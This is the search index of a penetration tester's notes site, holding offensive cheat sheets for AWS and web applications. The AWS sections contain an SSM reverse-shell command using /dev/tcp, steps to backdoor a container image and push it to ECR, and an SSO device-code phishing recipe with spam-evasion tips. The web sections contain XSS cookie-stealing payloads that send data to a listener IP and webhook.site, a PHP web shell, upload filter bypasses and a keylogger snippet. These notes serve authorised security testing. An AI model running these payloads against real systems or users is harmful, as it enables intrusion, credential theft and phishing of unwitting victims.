{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"$ whoami","text":""},{"location":"#jacob-hammargren","title":"Jacob Hammargren","text":"<p>\ud83d\udcbc LinkedIn       | \ud83d\udda5\ufe0f GitHub   | \ud83d\udcdc Resume  | \u2709\ufe0f Email</p>"},{"location":"#industry-certifications","title":"Industry Certifications","text":"Certified Penetration Testing Specialist (CPTS) Certified Red Team Operator (CRTO) Offensive AWS Security Professional Practical Web Pentest Associate (PWPA) Genesis Prolab Practical Network Penetration Tester Practical Junior Penetration Tester Certified Defensive Security Analyst Security+"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Authenticate/","title":"Authenticate","text":"<p>Authenticate to AWS with:</p> <pre><code>aws configure\n</code></pre> <p>OR env variables (if you\u2019re authing as a resource)</p> <pre><code>rm -rf ./aws\n</code></pre> <pre><code>export AWS_ACCESS_KEY_ID=&lt;token&gt;\nexport AWS_SECRET_ACCESS_KEY=&lt;token&gt;\nexport AWS_SESSION_TOKEN=&lt;token&gt;\n</code></pre> <p>OR</p> <pre><code>aws configure #add access and secret\naws configure set aws_session_token \"&lt;session token&gt;\"\n</code></pre> <p>Unset once you are done</p> <pre><code>unset AWS_ACCESS_KEY_ID\nunset AWS_SECRET_ACCESS_KEY\nunset AWS_SESSION_TOKEN\n</code></pre>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Compute%20Services%20%26%20Lateral%20Movement/","title":"Compute Services & Lateral Movement","text":"<p>Exploit misconfigurations in EC2 metadata, SSM, or user-data to gain code execution or extract credentials.</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Compute%20Services%20%26%20Lateral%20Movement/#instance-metadata-service-imds-enumeration","title":"Instance Metadata Service (IMDS) Enumeration","text":"<p>IMDSv1 (Unauthenticated Requests) <pre><code>curl http://169.254.169.254/latest/meta-data/\ncurl http://169.254.169.254/latest/meta-data/hostname\ncurl http://169.254.169.254/latest/meta-data/ami-id\ncurl http://169.254.169.254/latest/meta-data/instance-type\ncurl http://169.254.169.254/latest/meta-data/public-ipv4\ncurl http://169.254.169.254/latest/meta-data/security-groups\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name\n</code></pre> If a role is attached and has broad permissions (e.g., <code>AllowEC2ToReadSecrets</code>), you can retrieve secrets directly: <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AllowEC2ToReadSecrets\n</code></pre> IMDSv2 (Token-Based Access) <pre><code>TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n     http://169.254.169.254/latest/meta-data/iam/security-credentials/AllowEC2ToReadSecrets\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Compute%20Services%20%26%20Lateral%20Movement/#ec2-user-data-enumeration","title":"EC2 User Data Enumeration","text":"<p>Pull user data from all instances: <pre><code># userDataEnum.sh\n#!/bin/bash\n\ninstance_ids=$(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text)\nfor instance_id in $instance_ids; do\n    echo \"Getting userData for instance: $instance_id\"\n    user_data=$(aws ec2 describe-instance-attribute \\\n        --instance-id \"$instance_id\" \\\n        --attribute userData --output text 2&gt;/dev/null)\n    if [ -n \"$user_data\" ]; then\n        # Strip \"USERDATA\" prefix, then base64-decode\n        user_data=$(echo \"$user_data\" | sed 's/^USERDATAs*//' | sed '1d' | sed 's/^[[:space:]]*//')\n        echo \"Base64-encoded userData for $instance_id:\"\n        echo \"$user_data\"\n        echo \"Decoded userData for $instance_id:\"\n        echo \"$user_data\" | base64 -d\n    else\n        echo \"No userData for $instance_id\"\n    fi\n    echo \"-----------------------------------------\"\ndone\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Compute%20Services%20%26%20Lateral%20Movement/#aws-systems-manager-ssm-command-execution","title":"AWS Systems Manager (SSM) Command Execution","text":"<p>Check for SSM perms <pre><code>aws iam list-attached-user-policies --user-name &lt;USERNAME&gt;\n</code></pre> If you find a policy ARN such as <code>AllowSSMRunShellCommands</code>, retrieve its document: <pre><code>aws iam get-policy --policy-arn arn:aws:iam::&lt;ACCOUNT_ID&gt;:policy/AllowSSMRunShellCommands\naws iam get-policy-version \\\n  --policy-arn arn:aws:iam::&lt;ACCOUNT_ID&gt;:policy/AllowSSMRunShellCommands \\\n  --version-id v1\n</code></pre> Look for <code>\"ssm:SendCommand\"</code> in the document\u2019s <code>\"Statement\"</code> and note which targets (e.g., <code>\"Resource\": [\"arn:aws:ec2:us-east-1:&lt;ACCOUNT_ID&gt;:instance/i-0abcd1234\"]</code>) are allowed. Send a Command via SSM (Assuming Permissions Exist) <pre><code>aws ssm send-command \\\n  --instance-ids \"i-0abcd1234\" \\\n  --document-name \"AWS-RunShellScript\" \\\n  --comment \"ReverseShell\" \\\n  --parameters '{\"commands\":[\"bash -c \\'bash -i &gt;&amp; /dev/tcp/10.0.10.100/8443 0&gt;&amp;1\\'\"]}' \\\n  --output text\n</code></pre> If you need to base64-encode the payload to avoid shell\u2010quoting issues: <pre><code>PAYLOAD=$(echo \"bash -i &gt;&amp; /dev/tcp/10.0.10.100/8443 0&gt;&amp;1\" | base64)\naws ssm send-command \\\n  --instance-ids \"i-0abcd1234\" \\\n  --document-name \"AWS-RunShellScript\" \\\n  --comment \"ReverseShell\" \\\n  --parameters \"{\\\"commands\\\":[\\\"echo $PAYLOAD | base64 -d | bash\\\"]}\" \\\n  --output text\n</code></pre> Debug a Failed SSM Invocation: <pre><code>aws ssm list-command-invocations \\\n  --instance-id \"i-0abcd1234\" \\\n  --command-id \"cb542971-efb0-4f08-9281-9ca010a4c0ef\" \\\n  --details\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Credential%20%26%20Identity%20Attacks/","title":"Credential & Identity Attacks","text":"<p>Target IAM roles, policies, or SSO flows to obtain or elevate privileges. Generate &amp; Retrieve IAM Credential Report <pre><code>aws iam generate-credential-report\naws iam get-credential-report\n</code></pre> Retrieve All Roles You Can Assume <pre><code>aws iam get-account-authorization-details\n</code></pre> Review the <code>RoleDetailList</code> section for roles where you have <code>sts:AssumeRole</code> permissions. Confused Deputy / Role Chaining <pre><code>aws iam get-account-authorization-details\n</code></pre> Look for trust policies that allow <code>sts:AssumeRole</code> from an external account or cross-service trust. If you can assume a higher-privilege role in another account (Confused Deputy), you can pivot to that role.</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/","title":"Discovery & Reconnaissance","text":"<p>Map out accounts, services, regions, and resources that exist in the target AWS environment.</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/#region-enumeration","title":"Region Enumeration","text":"<p>With Pacu <pre><code>&gt;&gt; run general__enum_regions\n</code></pre> AWS CLI <pre><code>aws ec2 describe-regions\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/#iam-enumeration-credential-reporting","title":"IAM Enumeration &amp; Credential Reporting","text":"<p>Check password age, MFA enabled, access keys still active <pre><code>aws iam generate-credential-report\naws iam get-credential-report\n</code></pre> List All Roles &amp; Policies (find which IAM roles/users you can assume or attach): <pre><code>aws iam get-account-authorization-details \\\n  --output json \\\n  --query '{Roles:Roles, Users:UserDetailList}'\n</code></pre> Check Attached Policies <pre><code>aws iam list-user-policies --user-name &lt;USERNAME&gt;\naws iam list-attached-user-policies --user-name &lt;USERNAME&gt;\naws iam get-user-policy --user-name &lt;USERNAME&gt; --policy-name &lt;POLICY_NAME&gt;\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/#ec2-ebs-enumeration","title":"EC2 &amp; EBS Enumeration","text":"<p>List EC2 Instances <pre><code>aws ec2 describe-instances\n</code></pre> List EBS Volumes <pre><code>aws ec2 describe-volumes\n</code></pre> List EBS Snapshots (All &amp; By Owner) <pre><code># All snapshots in a region\naws ec2 describe-snapshots --region us-east-1\n\n# Snapshots owned by a specific account\naws ec2 describe-snapshots --region us-east-1 --owner-ids &lt;ACCOUNT_ID&gt;\n</code></pre> Automate EC2 / EBS Enumeration with Pacu** <pre><code>&gt;&gt; run ebs__enum_volumes_snapshots\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/#s3-bucket-discovery-interaction","title":"S3 Bucket Discovery &amp; Interaction","text":"<p>List All Buckets (If You Have Permissions) <pre><code>aws s3api list-buckets\n</code></pre> Automated Public Bucket Discovery (no auth) <pre><code>cloud_enum -k &lt;keyword&gt; -t 10 --disable-azure --disable-gcp\n</code></pre> FInd buckets with Google dorks <pre><code>site:.s3.amazonaws.com \"&lt;Target_Company&gt;\"\n\"Intitle:index.of.bucket\" \"&lt;Target_Company&gt;\"\n</code></pre> List Objects in a Bucket <pre><code>aws s3 ls s3://&lt;bucket-name&gt;\n</code></pre> Sync Entire Bucket Locally <pre><code>aws s3 sync s3://&lt;bucket-name&gt; .\n</code></pre> If Blocked / Rate-Limited (Use s3api) <pre><code>aws s3api get-object --bucket \"&lt;bucket-name&gt;\" --key \"&lt;object-key&gt;\" \"&lt;local-output&gt;\"\n</code></pre> List Object Versions (When Versioning Is Enabled) <pre><code>aws s3api list-object-versions --bucket &lt;bucket-name&gt;\n</code></pre> Dump All Object Versions via Script <pre><code># DumpObjectVersions.sh\nread -p \"Enter the S3 bucket name: \" BUCKET_NAME\nread -p \"Enter the local dir path where data will be saved: \" LOCAL\nobject_versions=$(aws s3api list-object-versions --bucket \"$BUCKET_NAME\" --no-sign-request | jq -c '.Versions[]')\nwhile IFS= read -r object_version; do\n    key=$(echo \"$object_version\" | jq -r '.Key')\n    version_id=$(echo \"$object_version\" | jq -r '.VersionId')\n    if [ -n \"$key\" ] &amp;&amp; [ \"$version_id\" != \"null\" ]; then\n        LOCAL_DIR=\"$LOCAL$key\"\n        mkdir -p \"$(dirname \"$LOCAL_DIR\")\"\n        aws s3api get-object --bucket \"$BUCKET_NAME\" \\\n          --no-sign-request \\\n          --key \"$key\" \\\n          --version-id \"$version_id\" \\\n          \"$LOCAL_DIR\"\n    fi\ndone &lt;&lt;&lt; \"$object_versions\"\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/#serverless-api-enumeration","title":"Serverless &amp; API Enumeration","text":"<p>List All Lambda Functions <pre><code>aws lambda list-functions\n</code></pre> Get Detailed Info for a Lambda <pre><code>aws lambda get-function --function-name &lt;function-name&gt;\n</code></pre> Retrieve a Lambda\u2019s Deployment Package (ZIP) copy the <code>\"Location\"</code> URL from <code>aws lambda get-function</code> output, download lambda: <pre><code>curl \"&lt;Location_URL&gt;\" -o lambda.zip\n</code></pre> Discover API Gateway Endpoints <pre><code>aws apigateway get-rest-apis\n</code></pre> From the returned ARN (<code>arn:aws:execute-api:&lt;region&gt;:&lt;account&gt;:&lt;api-id&gt;/*/*</code>), build the public invoke URL: <pre><code>https://&lt;api-id&gt;.execute-api.&lt;region&gt;.amazonaws.com\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/#container-services-enumeration","title":"Container Services Enumeration","text":"<p>List ECR Repositories <pre><code>aws ecr describe-repositories\n</code></pre> List Images in a Specific Repository <pre><code>aws ecr describe-images --repository-name &lt;repo-name&gt;\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/#backdoor-an-image-with-dockerscan","title":"Backdoor an Image with Dockerscan","text":"<p>install https://github.com/cr0hn/dockerscan <pre><code>git clone https://github.com/cr0hn/dockerscan\ncd dockerscan\nsudo python3.6 setup.py install\n</code></pre> Pull an existing image (Ubuntu as an example) <pre><code>docker pull ubuntu:latest\ndocker save ubuntu:latest -o ubuntu_original\n</code></pre> Trojanize it <pre><code>dockerscan image modify trojanize ubuntu_original \\\n  -l &lt;attacker_IP&gt; -p &lt;attacker_PORT&gt; -o alpine_infected\n</code></pre> Tag the infected image as :latest for ECR <pre><code>docker tag alpine_infected:latest \\\n  &lt;AWS_ACCOUNT_ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;REPO_NAME&gt;:latest\n</code></pre> Authenticate Docker to ECR <pre><code>aws ecr get-login-password --region &lt;region&gt; | sudo docker login --username AWS --password-stdin &lt;AWS_ACCOUNT_ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com\n</code></pre>  Push the backdoored image <pre><code>sudo docker push &lt;AWS_ACCOUNT_ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;REPO_NAME&gt;:latest\n</code></pre>  Wait for any running ECS/EKS node to pull and run the new image  Once you have a shell in a compromised pod, look for creds in env vars <code>env</code></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Phishing%20via%20SSO%20Device%20Codes/","title":"Phishing via SSO Device Codes","text":"<p>Exploit AWS SSO device code flows to trick users into authenticating and returning valid tokens. Clone the AWS SSO Device Code Tool <pre><code>git clone https://github.com/christophetd/aws-sso-device-code-authentication\ncd aws-sso-device-code-authentication\n</code></pre> Generate a Device Code URL <pre><code>python main.py \\\n  --sso-start-url https://mycompany.awsapps.com/start \\\n  --sso-region us-east-1 \\\n  --output-file ./sso_token.json\n</code></pre> This will display a URL of the form: <pre><code>https://device.sso.us-east-1.amazonaws.com/?user_code=PPSR-PVFH\n</code></pre> Send that URL to your target (e.g., via email). Once they enter the code, the tool will retrieve an SSO access token.</p> <p>note</p> <p>Ensure your sender domain is unlikely to be flagged as spam. Commonly trusted domains include <code>gmail.com</code>, <code>hotmail.com</code>, <code>yahoo.com</code>, etc.</p> <p>note</p> <p>After the user authenticates, you\u2019ll receive AWS SSO tokens valid for 8 hours, which can be exchanged for AWS credentials.</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Secrets%20%26%20Notification%20Services/","title":"Secrets & Notification Services","text":"<p>Enumerate and exploit Secrets Manager, SNS topics, or other services that may leak sensitive data.</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Secrets%20%26%20Notification%20Services/#secrets-manager-enumeration-exfiltration","title":"Secrets Manager Enumeration &amp; Exfiltration","text":"<p>List All Secrets (if permitted) <pre><code>aws secretsmanager list-secrets --region us-east-1\n</code></pre> Retrieve Secret Values <pre><code>aws secretsmanager get-secret-value \\\n  --secret-id &lt;SecretName&gt; \\\n  --region us-east-1\n</code></pre></p> <p>note</p> <p>If a role or user attached to the instance (via IMDS) has <code>secretsmanager:GetSecretValue</code>, you can retrieve high-value secrets (API keys, database credentials, etc.).</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Secrets%20%26%20Notification%20Services/#simple-notification-service-sns-enumeration","title":"Simple Notification Service (SNS) Enumeration","text":"<p>Identify Topic ARNs If you\u2019ve discovered an SNS topic ARN (e.g., via Secrets Manager or CloudFormation), subscribe to it to intercept messages (which sometimes contain provisioning or \u201conboarding\u201d notifications). <pre><code>aws sns list-topics --region us-east-1\n</code></pre> Subscribe to a topic <pre><code>aws sns subscribe \\\n  --topic-arn arn:aws:sns:us-east-1:&lt;ACCOUNT_ID&gt;:Onboarding_New_Internal_Dev_Msg_01 \\\n  --protocol email \\\n  --notification-endpoint you@example.com \\\n  --region us-east-1\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Serverless%20Services%20Exploitation/","title":"Serverless Services Exploitation","text":"<p>Dive deeper into compromised Lambda functions or API Gateway integrations to exfiltrate code/config or execute payloads.</p> <ol> <li>Enumerate Lambda Functions (see section 3.5).</li> <li>Download &amp; Inspect Deployment Package (ZIP and <code>env</code> variables inside).</li> <li>Identify Hardcoded Secrets or Misconfigurations (e.g., environment variables exposing DB credentials).</li> <li>Check Lambda Function Policy for \u201cInvokeFunction\u201d Permissions <pre><code>aws lambda get-policy --function-name &lt;function-name&gt;\n</code></pre></li> <li>If an API Gateway or SQS/SNS resource has permission to invoke, you can craft requests to trigger the function with malicious payloads.</li> <li>For API Gateway: build the base URL from the ARN returned by <code>get-policy</code> and send HTTP requests to test for command injection or exposed functions.</li> </ol>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Storage%20Enumeration%20%26%20Exploitation/","title":"Storage Enumeration & Exploitation","text":"<p>Once you know which buckets or volumes exist, try to retrieve or tamper with data. (See [[Discovery &amp; Reconnaissance]])</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Storage%20Enumeration%20%26%20Exploitation/#s3-buckets","title":"S3 Buckets","text":"<p>Upload Objects (if the bucket is writable): <pre><code>aws s3 cp &lt;localfile&gt; s3://&lt;bucket-name&gt;/\n</code></pre> Bucket ACL or Policy Misconfiguration <pre><code>aws s3api put-object --bucket &lt;bucket-name&gt; \\\n  --key \"test.txt\" --body \"./test.txt\"\n</code></pre> If it succeeds, the bucket is world-writeable.</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Storage%20Enumeration%20%26%20Exploitation/#ebs-snapshot-exploitation","title":"EBS Snapshot Exploitation","text":"<p>Identify accessible snapshots (See [[Discovery &amp; Reconnaissance]]) Use <code>dsnap</code> to download: <pre><code>dsnap --region &lt;region&gt; get &lt;SNAPSHOT_ID&gt;\n</code></pre> Launch a Docker container to mount the disk image: <pre><code>sudo IMAGE=&lt;path/to/snapshot.img&gt; make docker/run\n# Example: sudo IMAGE=./snap-xxxxxx.img make docker/run\n</code></pre> Inspect the mounted filesystem for AWS credentials in <code>~/.aws/credentials</code>, config files, or environment files.</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Tools/","title":"Tools","text":""},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Tools/#prowler","title":"Prowler","text":"<pre><code>git clone &lt;https://github.com/prowler-cloud/prowler.git&gt;\ncd prowler\npip3 install -r requirements.txt\n</code></pre> <pre><code>aws configure\n</code></pre> <pre><code>./prowler -M html -V\n</code></pre>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Tools/#scoutsuite","title":"Scoutsuite","text":"<p><pre><code>git clone &lt;https://github.com/nccgroup/ScoutSuite.git&gt;\ncd ScoutSuite\npip3 install -r requirements.txt\n</code></pre> <pre><code>python3 scout.py aws --report-dir ./scoutsuite_report --debug\n</code></pre> <pre><code>python3 scout.py aws --list-services\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Tools/#pacu-interactive-aws-attack-framework","title":"Pacu (Interactive AWS Attack Framework)","text":"<p><pre><code>git clone https://github.com/RhinoSecurityLabs/pacu\ncd pacu\npip3 install -r requirements.txt\n</code></pre> <pre><code>python3 pacu.py\n</code></pre> Import credentials (if needed) and enumerate permissions: <pre><code>&gt;&gt; import_keys --all      # Automatically load all AWS credentials from ~/.aws or environment\n&gt;&gt; run iam__enum_permissions\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/","title":"Under Construction","text":"<p>The notes in this section are still being migrated and are incomplete</p> <p>Resources - https://owasp.org/www-project-web-security-testing-guide/ - https://github.com/muslumsecurity/top25-parameters/tree/main</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/API/","title":"API","text":"<p>Post data <pre><code>curl -X POST -k &lt;ENDPOINT&gt; -d '{key:\"value\"}'\n</code></pre> proxy through burp <pre><code>curl -X POST -k --proxy http://localhost:8080 &lt;ENDPOINT&gt; -d '{key:\"value\"}'\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Cross-Site%20Scripting%20%28XSS%29/","title":"Cross Site Scripting (XSS)","text":"<p>Test html injection first, usually this is a good indicator (JS = you might need to bypass filter) <pre><code>&lt;h1&gt;test&lt;/h1&gt;\n</code></pre> Payloads <pre><code>&lt;script&gt;alert()&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;print()&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;prompt(\"string\")&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;\n</code></pre> <pre><code> &lt;plaintext&gt;\n</code></pre></p> <p>info</p> <p>Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of window.origin in the alert box, instead of a static value like 1. In this case, the alert box would reveal the URL it is being executed on</p> <p>You need to trigger XSS if not executed on page load <pre><code>&lt;img src=x onerror=\"prompt(1)\"&gt;\n</code></pre> Redirect <pre><code>&lt;img src=x onerror=\"window.location.href='&lt;https://example.com&gt;'\"&gt;\n</code></pre> script tag filter <pre><code>&lt;img src=x onerror=print()&gt;\n</code></pre> <pre><code>&lt;scri&lt;script&gt;pt&gt;prompt(1)&lt;scri&lt;/scr&lt;/script&gt;ipt&gt;\n</code></pre> Keylogger <pre><code>function logKey(event){console.log(event.key)}\n</code></pre> <pre><code> document.addEventListener('keydown', logKey)\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Cross-Site%20Scripting%20%28XSS%29/#dom-xss","title":"DOM XSS","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Cross-Site%20Scripting%20%28XSS%29/#identify","title":"Identify","text":"<p>You have XSS execution, but no http requests are being made. We see that the input parameter in the URL is using a hashtag # for the item we added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end. This is DOM XSS if we look at the page source by hitting <code>CTRL+U</code>, we will notice that our <code>test</code> string is nowhere to be found. This is because the JavaScript code is updating the page when we click the <code>Add</code> button We can still view the rendered page source with the Web Inspector tool by clicking <code>CTRL+SHIFT+C</code>:</p> <p></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Cross-Site%20Scripting%20%28XSS%29/#stored","title":"Stored","text":"<p>Steal admin cookie (classic) <pre><code>&lt;script&gt;fetch(\"&lt;http://192.168.187.130:9999/&gt;\" + document.cookie)&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;var i = new Image; i.src=\"https://webhook.site/9b3374bf-b997-4021-a302-de75a26fd841/?\"+document.cookie;&lt;/script&gt;\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Directory%20Fuzzing/","title":"Directory Fuzzing","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Directory%20Fuzzing/#directory-fuzzing","title":"Directory Fuzzing","text":"<p>ffuf <pre><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u &lt;URL&gt;/FUZZ\n</code></pre> <pre><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u &lt;URL&gt;/FUZZ -recursion\n</code></pre> <pre><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u &lt;URL&gt;/FUZZ -fc 200\n</code></pre> dirb <pre><code>dirb &lt;URL&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n</code></pre> <pre><code>dirb &lt;URL&gt; -X .html\n</code></pre> feroxbuster <pre><code>feroxbuster -u http://example.com -x php,html,htm,asp,aspx\n</code></pre> dirsearch <pre><code>dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://example.com\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Google%20Dorks/","title":"Google Dorks","text":"<p>Dorks <pre><code>site:site.com filetype:pdf\n</code></pre> - crt.sh - search through certificates <pre><code>%.site.com\n</code></pre> Asset finder: https://github.com/tomnomnom/assetfinder <pre><code>assetfinder &lt;DOMAIN&gt;\n</code></pre> <pre><code>assetfinder &lt;DOMAIN&gt; | grep &lt;DOMAIN&gt; | sort -u\n</code></pre> amass <pre><code>amass enum -d &lt;DOMAIN&gt;\n</code></pre> httpprobe <pre><code>cat &lt;SUBDOMAINSLIST&gt; | grep &lt;domain&gt; | sort -u | httpprobe -prefer-https | grep https\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Insecure%20File%20Uploads/","title":"Insecure File Uploads","text":"<pre><code>&lt;?php system($_GET['cmd']); ?&gt;\n</code></pre>"},{"location":"%F0%9F%8C%90%20Web%20Application/Insecure%20File%20Uploads/#client-side","title":"Client-Side","text":"<ul> <li>Intercept request, modify filetype, and filename, and replace data, send modified request</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Insecure%20File%20Uploads/#server-side-bypasses","title":"Server-Side Bypasses","text":"<p>extensions <pre><code>shell.php.png\nshell.php%00.png\nshell.phtml\nshell.inc\nshell.php3\nshell.php4\nshell.php5\n</code></pre> Content-Type <pre><code>kinda useless\n</code></pre> magic bytes https://en.wikipedia.org/wiki/List_of_file_signatures - Intercept request, insert php below magic bytes header, change filetype to php, and send</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Parameter%20Fuzzing/","title":"Parameter Fuzzing","text":"<p>GET <pre><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u https://example.com/administration/admin.php?FUZZ=key\n</code></pre> Then filter for size <pre><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u https://example.com/administration/admin.php?FUZZ=key -fs &lt;size&gt;\n</code></pre> POST <pre><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u https://example.com/administration/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs &lt;size filter&gt;\n</code></pre></p> <p>note</p> <p>Tip: In PHP, \"POST\" data \"content-type\" can only accept \"application/x-www-form-urlencoded\". So, we can set that in \"ffuf\" with -H</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Verb%20Tampering/","title":"Verb Tampering","text":"<code>GET</code> The <code>GET</code> method requests a representation of the specified resource. Requests using <code>GET</code> should only retrieve data and should not contain a request content. <code>HEAD</code> The <code>HEAD</code> method asks for a response identical to a <code>GET</code> request, but without a response body. <code>POST</code> The <code>POST</code> method submits an entity to the specified resource, often causing a change in state or side effects on the server.T <code>PUT</code> The <code>PUT</code> method replaces all current representations of the target resource with the request content. <code>DELETE</code> The <code>DELETE</code> method deletes the specified resource. <code>CONNECT</code> The <code>CONNECT</code> method establishes a tunnel to the server identified by the target resource. <code>OPTIONS</code> The <code>OPTIONS</code> method describes the communication options for the target resource. <code>TRACE</code> The <code>TRACE</code> method performs a message loop-back test along the path to the target resource. <code>PATCH</code> The <code>PATCH</code> method applies partial modifications to a resource."},{"location":"%F0%9F%8C%90%20Web%20Application/Web%20Application%20Firewall/","title":"Web Application Firewall","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Web%20Application%20Firewall/#waf-fingerprinting","title":"WAF Fingerprinting","text":"<p>wafw00f <pre><code>wafw00f &lt;URL&gt;\n</code></pre> Input known bad payload to understand WAF response *Input known good payload to understand standard response</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Access%20Control/Broken%20Function%20Level%20Access%20%28BLFA%29/","title":"Broken Function Level Access (BLFA)","text":"<p>Using a low privileged users session token, can you perform actions of another user? of a higher privileged user? </p> <p>Use multiple accounts for testing, preferably two user accounts and two admin accounts. Proxy an admin request through burp and execute an admin function, repeat this request but replace the admin session token with the user sessions token. Is the admin function executed?</p> <p>Tip:</p> <p>Utilize the firefox containers addon to maintain sessions across multiple account for ease of use. </p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Access%20Control/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/","title":"Insecure Direct Object Reference (IDOR)","text":"<p>Similar to Broken Object Level Access (BOLA) but less API focused, for example, iterating a pageID or page directory to view information of other users.</p> <p>ffuf - if you have UIDs (can be anything) <code>-mr</code> = regex match <pre><code>ffuf -u &lt;http://example.com/info.php?account=FUZZ&gt; -w &lt;UIDLIST&gt; -mr 'admin'\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Access%20Control/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/#api","title":"API","text":"<p>Post data <pre><code>curl -X POST -k &lt;ENDPOINT&gt; -d '{key:\"value\"}'\n</code></pre> proxy through burp <pre><code>curl -X POST -k --proxy http://localhost:8080 &lt;ENDPOINT&gt; -d '{key:\"value\"}'\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/-%20Getting%20Started/","title":"Getting Started","text":"<p>General Starting Point</p> <ul> 